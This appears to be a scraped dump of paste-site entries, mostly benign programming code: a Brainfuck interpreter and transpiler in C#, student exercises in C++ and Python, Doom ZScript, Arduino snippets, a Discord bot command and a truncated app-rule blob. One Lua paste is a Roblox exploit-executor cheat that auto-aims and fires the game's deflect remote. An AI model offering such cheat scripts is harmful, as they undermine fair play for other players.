                        {
                            instructionPointer++;
                            if (code[instructionPointer] == '[')
                                loopDepth++;
                            else if (code[instructionPointer] == ']')
                                loopDepth--;
                        }
                    }
                    break;

                case ']':
                    if (memory[dataPointer] != 0)
                    {
                        int loopDepth = 1;
                        while (loopDepth > 0)
                        {
                            instructionPointer--;
                            if (code[instructionPointer] == ']')
                                loopDepth++;
                            else if (code[instructionPointer] == '[')
                                loopDepth--;
                        }
                    }
                    break;

                default:
                    // Ignore any non-Brainfuck characters.
                    break;
            }

            instructionPointer++;
        }
    }

    public string GetOutput()
    {
        return new string(outputBuffer.ToArray());
    }
}

public class Token
{
    public TokenType Type { get; }
    public string Value { get; }

    public Token(TokenType type, string value)
    {
        Type = type;
        Value = value;
    }
}

public enum TokenType
{
    Number,
    Add,
    Subtract,
    Multiply,
    Divide,
    Modulo,
    OpenParen,
    CloseParen,
    EOF
}

public class Lexer
{
    private readonly string input;
    private int position;

    public Lexer(string input)
    {
        this.input = input;
        position = 0;
    }

    private char CurrentChar => position < input.Length ? input[position] : '\0';

    private void MoveNext()
    {
        position++;
    }

    private void SkipWhitespace()
    {
        while (char.IsWhiteSpace(CurrentChar))
        {
            MoveNext();
        }
    }

    private bool IsDigit(char c)
    {
        return char.IsDigit(c);
    }

    private bool IsOperator(char c)
    {
        return c == '+' || c == '-' || c == '*' || c == '/' || c == '%';
    }

    public Token GetNextToken()
    {
        while (CurrentChar != '\0')
        {
            if (char.IsWhiteSpace(CurrentChar))
            {
                SkipWhitespace();
                continue;
            }

            if (IsDigit(CurrentChar))
            {
                string number = """";
                while (IsDigit(CurrentChar))
                {
                    number += CurrentChar;
                    MoveNext();
                }

                return new Token(TokenType.Number, number);
            }

            if (IsOperator(CurrentChar))
            {
                TokenType type;
                switch (CurrentChar)
                {
                    case '+': type = TokenType.Add; break;
                    case '-': type = TokenType.Subtract; break;
                    case '*': type = TokenType.Multiply; break;
                    case '/': type = TokenType.Divide; break;
                    case '%': type = TokenType.Modulo; break;
                    default: throw new Exception(""Invalid operator."");
                }
                string op = CurrentChar.ToString();
                MoveNext();
                return new Token(type, op);
            }

            if (CurrentChar == '(')
            {
                MoveNext();
                return new Token(TokenType.OpenParen, ""("");
            }

            if (CurrentChar == ')')
            {
                MoveNext();
                return new Token(TokenType.CloseParen, "")"");
            }

            throw new Exception(""Invalid character."");
        }

        return new Token(TokenType.EOF, """");
    }
}

public class ASTNode
{
    public TokenType Type { get; }
    public string Value { get; }
    public ASTNode Left { get; set; }
    public ASTNode Right { get; set; }

    public ASTNode(TokenType type, string value)
    {
        Type = type;
        Value = value;
        Left = null;
        Right = null;
    }
}

public class Parser
{
    private readonly Lexer lexer;
    private Token currentToken;

    public Parser(Lexer lexer)
    {
        this.lexer = lexer;
        currentToken = lexer.GetNextToken();
    }

    private void Eat(TokenType type)
    {
        if (currentToken.Type == type)
        {
            currentToken = lexer.GetNextToken();
        }
        else
        {
            throw new Exception($""Expected {type}, but got {currentToken.Type}."");
        }
    }

    private ASTNode Factor()
    {
        Token token = currentToken;
        if (token.Type == TokenType.Number)
        {
            Eat(TokenType.Number);
            return new ASTNode(TokenType.Number, token.Value);
        }
        else if (token.Type == TokenType.OpenParen)
        {
            Eat(TokenType.OpenParen);
            ASTNode node = Expr();
            Eat(TokenType.CloseParen);
            return node;
        }

        throw new Exception(""Invalid expression."");
    }

    private ASTNode Term()
    {
        ASTNode node = Factor();

        while (currentToken.Type == TokenType.Multiply || currentToken.Type == TokenType.Divide || currentToken.Type == TokenType.Modulo)
        {
            Token token = currentToken;
            if (token.Type == TokenType.Multiply)
            {
                Eat(TokenType.Multiply);
                node = new ASTNode(TokenType.Multiply, token.Value) { Left = node, Right = Factor() };
            }
            else if (token.Type == TokenType.Divide)
            {
                Eat(TokenType.Divide);
                node = new ASTNode(TokenType.Divide, token.Value) { Left = node, Right = Factor() };
            }
            else if (token.Type == TokenType.Modulo)
            {
                Eat(TokenType.Modulo);
                node = new ASTNode(TokenType.Modulo, token.Value) { Left = node, Right = Factor() };
            }
        }

        return node;
    }

    private ASTNode Expr()
    {
        ASTNode node = Term();

        while (currentToken.Type == TokenType.Add || currentToken.Type == TokenType.Subtract)
        {
            Token token = currentToken;
            if (token.Type == TokenType.Add)
            {
                Eat(TokenType.Add);
                node = new ASTNode(TokenType.Add, token.Value) { Left = node, Right = Term() };
            }
            else if (token.Type == TokenType.Subtract)
            {
                Eat(TokenType.Subtract);
                node = new ASTNode(TokenType.Subtract, token.Value) { Left = node, Right = Term() };
            }
        }

        return node;
    }

    public ASTNode Parse()
    {
        return Expr();
    }
}

public class BrainfuckTranspiler
{
    public static string Transpile(string input)
    {
        Lexer lexer = new Lexer(input);
        Parser parser = new Parser(lexer);
        ASTNode root = parser.Parse();
        return GenerateBrainfuckCode(root) + ""."";
    }

    private static string GenerateBrainfuckCode(ASTNode node)
    {
        if (node.Type == TokenType.Number)
        {
            int value = int.Parse(node.Value);
            return new string('+', value);
        }

        string leftCode = GenerateBrainfuckCode(node.Left);
        string rightCode = GenerateBrainfuckCode(node.Right);

        switch (node.Type)
        {
            case TokenType.Add:
                return leftCode + "">"" + rightCode + ""[-<+>]<"";
            case TokenType.Subtract:
                return leftCode + "">"" + rightCode + ""[-<->]<"";
            case TokenType.Multiply:
                return leftCode + "">"" + rightCode + ""<[>[->+>+<<]>[-<+>]<<-]>[-]>>[-<<<+>>>]<<<"";
            case TokenType.Divide:
                return leftCode + "">>>>"" + rightCode + ""<<<<[->+>>+>-[<-]<[<<[->>>+<<<]>>>>+<<-<]<<]>[-]>[-]>[-]>[-]>[-<<<<<+>>>>>]<<<<<"";
            case TokenType.Modulo:
                return leftCode + "">>>>"" + rightCode + ""<<<<[->+>>+>-[<-]<[<<[->>>+<<<]>>>>+<<-<]<<]>>[-]>[-]>[-]><<<<[-<+>]<"";
            default:
                throw new Exception(""Invalid node type."");
        }
    }
}"
EtNWPY11,Untitled,VladislavKovalskyi,Python,Saturday 22nd of July 2023 05:34:20 AM CDT,"import os
""""""
Завдання:
Вам потрібно написати програму, яка буде:
    • Додавати людину в БД
    • Видаляти людину з БД за її номером
    • Виводити список всіх людей в БД з їх номером
    • Редагувати інформацію про людину за її номером
    • Редагувати інформацію про людину за прізвищем
    • Виводити суму всіх балансів
    • Виводити людину, у якої найдовше прізвище

Вимоги:
    Словник має мати такі ключі: name, surname, balance
    Обов'язкове використання list, dict
""""""

users: list = []
number = 0

while True:
    print(
        ""Меню:\n""
        ""1. Додати людину\n""
        ""2. Видалити людину за номером\n""
        ""3. Вивести всіх людей\n""
        ""4. Редагувати інформацію про людину за номером \n""
        ""5. Редагувати інформацію про людину за прізвищем\n""
        ""6. Вивести мілліонера\n""
        ""7. Вивести людину з найдовшим прізвищем\n""
    )
    command = int(input(""Введіть номер команди: ""))
    os.system(""cls"")
    if command == 1:
        name = input(""Введіть ім'я: "")
        surname = input(""Введіть прізвище: "")
        balance = float(input(""Введіть баланс: ""))
        users.append({""name"": name, ""surname"": surname, ""balance"": balance})
        print(f""Ви успішно додали {len(users)}(-у) людину"")
        number += 1
    elif command == 2:
        num = int(input(""Введіть номер людини""))
        users.pop(num)
    elif command == 3:
        print(""Список всіх людей:"")
        for i, user in enumerate(users, 1):
            print(f""#{i} - Ім'я: {user['name']}\tПрізвище: {user['surname']}\tБаланс: {user['balance']}"")


    
    
    "
dL98gcUT,DEFLECT Script,A_GUES,Lua,Saturday 22nd of July 2023 05:19:55 AM CDT,"getgenv().Toggle = true
getgenv().BallDirection = Vector3.new(999999, 999999, 999999)

local plr = game.Players.LocalPlayer
local ball = nil

local function getBall()
    while true do 
        game:GetService(""RunService"").Stepped:Wait()
        if workspace:FindFirstChild(""Ball"") ~= nil then
            ball = workspace.Ball
            break
        end
    end
end

task.spawn(getBall)

while getgenv().Toggle do 
    game:GetService(""RunService"").Stepped:Wait()
    if (ball and ball:FindFirstChild(""Main"") and plr.Character ~= nil) then
        local distance = (ball.Main.Position - plr.Character.HumanoidRootPart.Position).Magnitude
        plr.Character.HumanoidRootPart.CFrame = CFrame.lookAt(plr.Character.HumanoidRootPart.Position, Vector3.new(ball.Main.Position.X, plr.Character.HumanoidRootPart.Position.Y, ball.Main.Position.Z))
        if (distance <= 17.8) then
            plr.Character:WaitForChild(""Deflection"").Remote:FireServer(""Deflect"", getgenv().BallDirection)
        end
    end
end
"
ui4ztHFy,Basic Shield System for ZScript,LadyFuzztail,C#,Saturday 22nd of July 2023 05:09:46 AM CDT,"class URPlayer : DoomPlayer
{
	int shieldMax;
	double shieldRechargeRate;
	int shieldRechargeDelay;
	int	armorBase;
	int armorMax;
	int nanitePool;
	property spMax : shieldMax;
	property spRate : shieldRechargeRate;
	property spDelay : shieldRechargeDelay;
	property apBase : armorBase;
	property apMax : armorMax;
	property npMax : nanitePool;
	
	Default
	{
		URPlayer.spMax 		25;
		URPlayer.spRate		15.;
		URPlayer.spDelay	140;
		URPlayer.apBase		10;
		URPlayer.apMax		200;
		URPlayer.npMax		200;
	}
}

class ProtoPossPawn : URPlayer
{
	Default
	{
		Health					75;
		Player.MaxHealth 		75;
		Player.DisplayName 		""Odysseus"";
		URPlayer.spMax 			50;
		URPlayer.spRate			25.;
		URPlayer.spDelay		140;
		URPlayer.apBase			15;
		URPlayer.apMax			150;
		URPlayer.npMax			150;
	}
}

class CommandoPawn : URPlayer
{
	Default
	{
		Health					100;
		Player.MaxHealth		100;
		Player.DisplayName		""Isabel"";
		URPlayer.spMax			25;
		URPlayer.spRate			15.;
		URPlayer.spDelay		140;
		URPlayer.apBase			20;
		URPlayer.apMax			200;
		URPlayer.npMax			100;
	}
}

class ShieldHandler : EventHandler
{
	override void WorldThingSpawned(WorldEvent e)
	{
		if (e.thing.player && !e.thing.FindInventory(""ShieldControl""))
			e.thing.GiveInventory(""ShieldControl"",1);
	}
}

class ShieldControl : Inventory
{
	int shieldRegenCD;
	double shieldRegenTics;
	URPlayer plr;
	
	Default
	{
		Inventory.MaxAmount		1;
		+Inventory.Undroppable
		+Inventory.Untossable
	}
	
	override void AttachToOwner(Actor other)
	{
		super.AttachToOwner(other);
		plr = URPlayer(owner);
		if (!owner)
			return;
		shieldRegenCD = 0;
		shieldRegenTics = 0.;
	}
	
	override void DoEffect()
	{
		super.DoEffect();
		if (!owner || owner.player.health <= 0)
			return;
		if (owner is ""URPlayer"")
		{
			ShieldRegen();
		}
	}
	
	void ShieldRegen()
	{
		if ( shieldRegenCD > 0 ) {
			--shieldRegenCD;
		} else {
			if (plr)
			{
				if (owner.CountInv(""ShieldPoints"") < plr.shieldMax) {
					shieldRegenTics += (plr.shieldRechargeRate * 0.01 * plr.shieldMax);
				} else {
					shieldRegenTics = 0.0;
				}
				while ( shieldRegenTics > 35.0 && owner.CountInv(""ShieldPoints"") < plr.shieldMax )
				{
					owner.GiveInventory(""ShieldPoints"",1);
					shieldRegenTics -= 35.0;
				}
			}
		}
	}
	
	override void ModifyDamage (int damage, Name damageType, out int newdamage, bool passive, Actor inflictor, Actor source, int flags)
	{
		int currSP;
		int blockedDamage;
		
		if (passive && damage > 0) {
			currSP = owner.CountInv(""ShieldPoints"");
			if (damage <= currSP) {
				blockedDamage = damage;
				newdamage = 0;
			} else {
				blockedDamage = currSP;
				newdamage = damage - currSP;
			}
			shieldRegenCD = plr.shieldRechargeDelay;
			owner.TakeInventory(""ShieldPoints"",blockedDamage);
		}
	}
}

class ShieldPoints : Inventory
{
	Default
	{
		Inventory.MaxAmount		9999;
		+Inventory.Undroppable
		+Inventory.Untossable
		+Inventory.KeepDepleted
	}
}"
zpida05Y,Untitled,LadyFuzztail,C#,Saturday 22nd of July 2023 04:36:48 AM CDT,"class URPlayer : DoomPlayer
{
	int shieldMax;
	double shieldRechargeRate;
	int shieldRechargeDelay;
	int	armorBase;
	int armorMax;
	int nanitePool;
	property spMax : shieldMax;
	property spRate : shieldRechargeRate;
	property spDelay : shieldRechargeDelay;
	property apBase : armorBase;
	property apMax : armorMax;
	property npMax : nanitePool;
	
	Default
	{
		URPlayer.spMax 		25;
		URPlayer.spRate		15.;
		URPlayer.spDelay	140;
		URPlayer.apBase		10;
		URPlayer.apMax		200;
		URPlayer.npMax		200;
	}
}

class ProtoPossPawn : URPlayer
{
	Default
	{
		Health					75;
		Player.MaxHealth 		75;
		Player.DisplayName 		""Odysseus"";
		URPlayer.spMax 			50;
		URPlayer.spRate			39.6825;
		URPlayer.spDelay		84;
		URPlayer.apBase			15;
		URPlayer.apMax			150;
		URPlayer.npMax			150;
	}
}

class CommandoPawn : URPlayer
{
	Default
	{
		Health					100;
		Player.MaxHealth		100;
		Player.DisplayName		""Isabel"";
		URPlayer.spMax			25;
		URPlayer.spRate			25.;
		URPlayer.spDelay		140;
		URPlayer.apBase			20;
		URPlayer.apMax			200;
		URPlayer.npMax			100;
	}
}

class ShieldHandler : EventHandler
{
	override void WorldThingSpawned(WorldEvent e)
	{
		if (e.thing.player && !e.thing.FindInventory(""ShieldControl""))
			e.thing.GiveInventory(""ShieldControl"",1);
	}
	
	override void WorldThingDamaged(WorldEvent e)
	{
		if (!e.thing.FindInventory(""ShieldControl""))
			return;
		
		let shield = ShieldControl(e.thing.FindInventory(""ShieldControl""));
		if (!shield)
			return;
		URPlayer plr = URPlayer(e.thing);
		if (!plr)
			return;
		shield.shieldRegenCD = plr.shieldRechargeDelay;
	}
}

class ShieldControl : Inventory
{
	int shieldRegenCD;
	double shieldRegenTics;
	
	Default
	{
		Inventory.MaxAmount		1;
		+Inventory.Undroppable
		+Inventory.Untossable
	}
	
	override void AttachToOwner(Actor other)
	{
		super.AttachToOwner(other);
		if (!owner)
			return;
		shieldRegenCD = 0;
		shieldRegenTics = 0.;
	}
	
	override void DoEffect()
	{
		super.DoEffect();
		if (!owner || owner.player.health <= 0)
			return;
		if (owner is ""URPlayer"")
		{
			ShieldRegen();
		}
	}
	
	void ShieldRegen()
	{
		if ( shieldRegenCD > 0 ) {
			--shieldRegenCD;
		} else {
			URPlayer plr = URPlayer(owner);
			if (plr)
			{
				shieldRegenTics += (plr.shieldRechargeRate * 0.01 * plr.shieldMax);
				while ( shieldRegenTics > 35.0 && owner.CountInv(""ShieldPoints"") < plr.shieldMax )
				{
					owner.GiveInventory(""ShieldPoints"",1);
					shieldRegenTics -= 35.0;
				}
			}
		}
	}
	
	override void ModifyDamage (int damage, Name damageType, out int newdamage, bool passive, Actor inflictor, Actor source, int flags)
	{
		int currSP;
		int blockedDamage;
		
		if (passive && damage > 0) {
			currSP = CountInv(""ShieldPoints"");
			if (damage <= currSP) {
				blockedDamage = damage;
				newdamage = 0;
				TakeInventory(""ShieldPoints"",blockedDamage);
			} else {
				blockedDamage = currSP;
				newdamage = damage - currSP;
				TakeInventory(""ShieldPoints"",blockedDamage);
			}
		}
	}
}

class ShieldPoints : Inventory
{
	Default
	{
		Inventory.MaxAmount		9999;
		+Inventory.Undroppable
		+Inventory.Untossable
		+Inventory.KeepDepleted
	}
}"
gggr0X4X,Untitled,Josif_tepe,C++,Saturday 22nd of July 2023 04:27:59 AM CDT,"#include <iostream>
#include <algorithm>
#include <cstring>
#include <vector>
#include <set>
using namespace std;

/*
 da se napise programa koja ke gi sobere cifrite na eden broj
 rekurzivno
 **/
int dp[1005];
int fib(int n) {
    if(n <= 2) {
        return 1;
    }
    if(dp[n] != -1) {
        return dp[n];
    }
    return dp[n] = fib(n - 1) + fib(n - 2);
}
int main() {
    ios::sync_with_stdio(false);
    memset(dp, -1, sizeof dp);
    cout << fib(5) << endl;
    return 0;
}
// fib(5) = fib(4) + [fib(3)] = 3 + 2 = 5
// fib(4) = fib(3) + fib(2) = 2 + 1 = 3
// fib(3) = fib(2) + fib(1) = 2
// fib(2) = 1
// fib(1) = 1
// fib(2) = 1
// fib(3) = 2
"
LJ2PJhrv,Untitled,35657,C++,Saturday 22nd of July 2023 04:22:52 AM CDT,"#include <iostream>
using namespace std;

int power(int a, int n) {
    if (n == 0) {
        return 1;
    }
    return a * power(a, n - 1);
}

int main() {
    setlocale(LC_ALL, ""ru"");
    int a, n;
    cout << ""Введите число: "";
    cin >> a;
    cout << ""Введите степень: "";
    cin >> n;
    cout << power(a, n);
}"
xQk2kFT9,Untitled,Josif_tepe,C++,Saturday 22nd of July 2023 03:56:41 AM CDT,"#include <iostream>
#include <algorithm>
#include <cstring>
#include <vector>
#include <set>
using namespace std;
using namespace std;

const long long mod=1e9+7;

int main() {
    ios::sync_with_stdio(false);
    int n, k;
    cin >> n >> k;
    vector<pair<int, int>> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i].second >> v[i].first;
    }
    
    sort(v.begin(), v.end());
    
    multiset<int> ms;
    
    for(int i = 0; i < k; i++) {
        ms.insert(0);
    }
    int result = 0;
    for(int i = 0; i < n; i++) {
        int S = v[i].second;
        int E = v[i].first;
        multiset<int>::iterator it = ms.upper_bound(S);
        if(it != ms.begin()) {
            it--;
            ms.erase(it);
            ms.insert(E + 1);
            result++;
        }
        
    }
    cout << result << endl;
  
    return 0;
}
"
BEuLgBap,get_data_ultrasonic.ino,basyair7,Arduino,Saturday 22nd of July 2023 03:22:19 AM CDT,"// buat fungsi program untuk sensor ultrasonic 
 long sensorUltrasonic() { 
   // proses pemancaran suara ultrasonic 
   digitalWrite(pinTrig, LOW); 
   delayMicroseconds(80); 
   digitalWrite(pinTrig, LOW); 
   digitalWrite(pinTrig, HIGH); 
   delayMicroseconds(80); 
   delayMicroseconds(80); 
  
   // proses penerimaan suara ultrasonic 
   long durasi = pulseIn(pinEcho, HIGH); 
   long jarak = (durasi / 2) / 2.91; // mengubah durasi menjadi panjang jarak (cm) 
  
   return jarak; 
 }"
C88nPcdn,Struc Data to and from EEPROM,Rhavecilla,C++,Saturday 22nd of July 2023 02:42:20 AM CDT,"/*  PROGRAM ID: 5-ChannelsPowerControl.ino
 *  PROGRAMMER: Rolando Avecilla 
 *  DATE      : 
 *  DONE      : 
 *  OBJECTIVE : 
 *  TARGET    : Teensy 3.6
 *  NOTE      : 
 *
 */


//===============================================================//
// Load libraries.                                               //
//===============================================================//
#include <EEPROM.h>


//===============================================================//
// Global variables and constant.                                //
//===============================================================//

// Define struct
struct structData {
  int intVar;
  float floatVar;
  bool boolVar;
};

void setup() {
  Serial.begin(115200);
  
  // Define and then initialize struct instance.
  structData forSAving;
  forSAving.intVar = 42;
  forSAving.floatVar = 3.14;
  forSAving.boolVar = true;

  // Save the struct to EEPROM.
  saveToEEPROM(forSAving);

  delay(3000);

  // Retrieve the struct from EEPROM.
  structData forRetrieving;
  retrieveFromEEPROM(forRetrieving);  

  Serial.println(forRetrieving.intVar);
  Serial.println(forRetrieving.floatVar);
  Serial.println(forRetrieving.boolVar);

  Serial.println(""Setup ends."");
}

void loop() {
  // do nothing.
}

// Function to store data in EEPROM.
void saveToEEPROM(const structData& data) {
  // Calculate the starting EEPROM address for your data.
  int address = 0;

  // Write the data to EEPROM byte by byte.
  byte* pData = (byte*)&data;
  for (unsigned int i = 0; i < sizeof(data); i++) {
    EEPROM.write(address + i, pData[i]);
    delay(100);
  }
}

// Function to retrieve the struct from EEPROM.
void retrieveFromEEPROM(structData& data) {
  // Calculate the starting EEPROM address for your data.
  int address = 0;

  // Read the data from EEPROM byte by byte.
  byte* pData = (byte*)&data;
  for (unsigned int i = 0; i < sizeof(data); i++) {
    pData[i] = EEPROM.read(address + i);
  }
}

"
USCE4kR0,Untitled,35657,C++,Saturday 22nd of July 2023 02:31:28 AM CDT,"#include <iostream>

using namespace std;

int Fact(int N) {
    if (N < 1) { // факториал это произведение натуральных чисел от 1 до N (если N < 1 возвращаем 0)
        return 0;
    }
    else if (N == 1) {  // условие выхода из рекурсии, обязательно!
        return 1;
    }
    else {
        return N * Fact(N - 1); //функция вызывает саму себя, но с меньшим параметром
    }
}


//N!= 1 * 2 * 3 * ... * N

//N!= N * (N - 1)!

//1!= 1;



int main() {
    setlocale(LC_ALL, ""ru"");

    cout << Fact(3) << endl;
}
"
7cwJYBmx,How to make a balance command in aoi.js,Dreamer_1314,JavaScript,Saturday 22nd of July 2023 02:24:06 AM CDT,"Variables Required :
Coins = 25000
Bank = 0

For non command handler user :
bot.command({
  name: ""balance"",
  aliases: [
    ""bal"",
    ""Balance"",
    ""Bal""
  ],
  code: `
  $title[$username's Balance]
  $description[$getGlobalUserVar[Coins;$authorID] Coins
$getGlobalUserVar[Bank;$authorID] Bank]
  $color[00ff6c]
  $footer[Requested By $userTag[$authorID]]
  $addTimestamp
  `
)}

for command handler users :
module.exports = ({
  name: ""balance"",
  aliases: [
    ""bal"",
    ""Balance"",
    ""Bal""
  ],
  code: `
  $title[$username's Balance]
  $description[$getGlobalUserVar[Dream Coins;$authorID] Dream Coins
$getGlobalUserVar[Bank;$authorID] Bank]
  $color[00ff6c]
  $footer[Requested By $userTag[$authorID]]
  $addTimestamp
  `
)}"
5XYdqy3U,Untitled,35657,C++,Saturday 22nd of July 2023 02:10:34 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
void bubble_sort(T array[], int size) {
    for (int k = 0; k < size; k++) {
        for (int j = 0; j < size - 1; j++) {
            if (array[j] > array[j + 1]) {
                T temp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = temp;
            }
        }
    }
}


template <typename T>
void display(T array[], int size) {
    for (int i = 0; i < size; i++) {
        cout << array[i] << "" "";
    }
    cout << endl;
}


int main() {
    setlocale(LC_ALL, ""ru"");

    int array[]{ 1, 3, 7, -4, -2, 4 };
    int size = 6;
    cout << ""Original int Array : "";
    display(array, size);
    bubble_sort(array, size);
    cout << ""Sorted   int Array : "";
    display(array, size);


    double doublearray[]{ 3.5, 2.5, 3.7, 1.0, 3.3 };
    size = 5;
    cout << ""Original double Array : "";
    display(doublearray, size);
    bubble_sort(doublearray, size);
    cout << ""Sorted double Array : "";
    display(doublearray, size);
}
"
jHC6NHCf,ski trip,fingli,Python,Saturday 22nd of July 2023 02:08:24 AM CDT,"days = int(input())
pom = input()
eval = input()

nights = days - 1
room_for_one = 18
apartment = 25
president_apartment = 35

if days < 10:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.30)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.10)
elif 10 <= days <= 15:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.35)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.15)
elif days > 15:
    if pom == ""apartment"":
        apartment = apartment - (apartment * 0.50)
    elif pom == ""president apartment"":
        president_apartment = president_apartment - (president_apartment * 0.20)

if eval == ""positive"":
    room_for_one = room_for_one + (room_for_one * 0.25)
    apartment = apartment + (apartment * 0.25)
    president_apartment = president_apartment + (president_apartment * 0.25)
elif eval == ""negative"":
    room_for_one = room_for_one - (room_for_one * 0.10)
    apartment = apartment - (apartment * 0.10)
    president_apartment = president_apartment - (president_apartment * 0.10)

if pom == ""room for one person"":
    print(f""{nights * room_for_one:.2f}"")
elif pom == ""apartment"":
    print(f""{nights * apartment:.2f}"")
elif pom == ""president apartment"":
    print(f""{nights * president_apartment:.2f}"")
"
fZHfUc9V,Untitled,35657,C++,Saturday 22nd of July 2023 01:22:58 AM CDT,"#include <string>
#include <iostream>

using namespace std;


// Человек
class Person {
public:

    Person(string name, string gender, int age) : name_(name), gender_(gender), age_(age) {}

    void SetName(string name) {
        name_ = name;
    }

    void SetGender(string gender) {
        gender_ = gender;
    }

    void SetAge(int age) {
        age_ = age;
    }

    string GetName() const {
        return name_;
    }
    int GetAge() const {
        return age_;
    }
    string GetGender() const {
        return gender_;
    }

    virtual void Speak() {
        cout << ""Привет!"" << endl;
    }

    string name_;
    string gender_;
    int age_;
};


class Wolf {

public:

    Wolf(int weight, int height, string colour) : weight_(weight), height_(height), colour_(colour) {}

    void SetWeight(int weight) {
        weight_ = weight;
    }

    int GetWeight() {
        return weight_;
    }

    void SetHeight(int height) {
        height_ = height;
    }

    int GetHeight() {
        return height_;
    }

    void SetColour(string colour) {
        colour_ = colour;
    }

    string GetColour() {
        return colour_;
    }

private:
    int weight_;
    int height_;
    string colour_;
};


class Warewolf : public Person, public Wolf {
public:

    Warewolf(string name, string gender, int age, int weight, int height, string colour) : Person(name, gender, age), Wolf(weight, height, colour) {}

    void Speak() override {
        cout << ""У-у-у-у-у-у!"" << endl;
    }
};


int main() {
    setlocale(LC_ALL, ""ru"");

    Warewolf wf(""John"", ""man"", 20, 100, 50, ""Gray"");

    wf.SetName(""John"");
    wf.SetColour(""Gray"");
    cout << wf.GetName() << "" "" << wf.GetColour() << endl;
    wf.Speak();
}"
WGW2fMUH,邀您一起看：封神第一部,xiaomianao666,JavaScript,Saturday 22nd of July 2023 01:04:34 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥封神第一部@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS4gOe6p+WIhuexu+WIl+ihqFwiLFwicGF0aFwiOlwieWlcIixcInJ1bGVcIjpcImpzOlxcbi8qXFxu5LiA57qn5bCB6KOFIFxcbuWKqOaAgeWIhuexuyDliJfooajliJvlu7og6Ieq5Yqo5LiL5LiA6aG1XFxudmVyIDIwMjMwNzEwIDEuMFxcbiovXFxuZnVuY3Rpb24gZHluYW1pY0NsYXNzKG9wdGlvbnMpIHtcXG4gIGNvbnN0IG9iaiA9IHtcXG4gICAgLy/pu5jorqTlgLxcXG4gICAgbGF5b3V0OiBcXFwidW5kZWZpbmVkXFxcIixcXG4gICAgaHRtbDogXFxcImVtcHR5XFxcIixcXG4gICAgcGFnZTogMCxcXG4gICAg5YiG57G76aKc6ImyOiBcXFwiI0ZBNzI5OFxcXCIsXFxuICAgIOaKmOWPoDogXFxcIuKAnOKAnOKAneKAnTxiPlxcXCIgKyBcXFwi4oioXFxcIi5mb250Y29sb3IoXFxcIiMxYWFkMTlcXFwiKSArIFxcXCI8L2I+XFxcIixcXG4gICAg5bGV5byAOiBcXFwi4oCc4oCc4oCd4oCdPGI+XFxcIiArIFxcXCLiiKdcXFwiLmZvbnRjb2xvcihcXFwiI0ZGMDAwMFxcXCIpICsgXFxcIjwvYj5cXFwiLFxcbiAgICBvcGVuOiB0cnVlLFxcbiAgICBzdGF0ZTogTVlfUlVMRS51cmwsXFxuICAgIHNlYXJjaDogZmFsc2UsXFxuICAgIGNsZWFyczogW10sXFxuICAgIGNsZWFyYWxsOiBbXFxcInlpX2ZpcnN0cGFnZVxcXCJdLFxcbiAgICBkZWJ1ZzogZmFsc2UsXFxuXFxuICAgIOmihOiuvihwYXJhbSkge1xcbiAgICAgIGlmKHBhcmFtPT11bmRlZmluZWQpe1xcbiAgICAgICAgcGFyYW09W107XFxuICAgICAgfVxcbiAgICAgIE9iamVjdC5rZXlzKHBhcmFtKS5mb3JFYWNoKChwcm9wZXJ0eSkgPT4ge1xcbiAgICAgICAgLy8g5a+55q+P5Liq5bGe5oCn5ZCN5omn6KGM5pON5L2cXFxuICAgICAgICBjb25zdCB2YWx1ZSA9IHBhcmFtW3Byb3BlcnR5XTsgLy8g6I635Y+W5bGe5oCn5YC8XFxuICAgICAgICAvLyDlnKjov5nph4zmiafooYzmgqjnmoTmk43kvZxcXG4gICAgICAgIHRoaXNbcHJvcGVydHldID0gdmFsdWU7XFxuICAgICAgICBpZiAodGhpcy5kZWJ1Zykge1xcbiAgICAgICAgICBjb25zb2xlLmxvZyhwcm9wZXJ0eSArIFxcXCI6XFxcIiArIHZhbHVlKTtcXG4gICAgICAgIH1cXG4gICAgICB9KTtcXG4gICAgfSxcXG4gICAgZXZhbEpTUnVsZShpdGVtLCBqc1J1bGUpIHtcXG4gICAgICBsZXQgcnVsZSA9IGpzUnVsZS5yZXBsYWNlKFxcXCJAanM6XFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgIHJ1bGUgPSBydWxlLnRyaW0oKTtcXG4gICAgICAvL2xvZygkLnN0cmluZ2lmeShydWxlKSlcXG4gICAgICBsZXQgaW5wdXQgPSBpdGVtO1xcbiAgICAgIGlmIChydWxlLnN0YXJ0c1dpdGgoXFxcIihcXFwiKSkge1xcbiAgICAgICAgZXZhbChcXFwicmVzdWx0ID0gXFxcIiArIHJ1bGUpO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICAvKipcXG4gICAgICAgICAqIOi/mOWOn+aIkCAkLnRvU3RyaW5nKC4uLikg55qE5pyA57uI57uT5p6c77yM6L6+5Yiw5pyA57uI5aSE55CG5pa55byP6Lef5LiK6Z2i55qEIGlmIOS4gOiHtOeahOebrueahFxcbiAgICAgICAgICovXFxuICAgICAgICBldmFsKFxcXCJyZXN1bHQgPSBcXFwiICsgXFxcIigoKSA9PiB7XFxcIiArIHJ1bGUgKyBcXFwifSkoKVxcXCIpO1xcbiAgICAgIH1cXG4gICAgICByZXR1cm4gcmVzdWx0IHx8IFxcXCJcXFwiO1xcbiAgICB9LFxcbiAgICBnZXRUaXRsZShzcmMsIGNhdGVnb3J5KSB7XFxuICAgICAgbGV0IHRpdGxlID0gXFxcIlxcXCI7XFx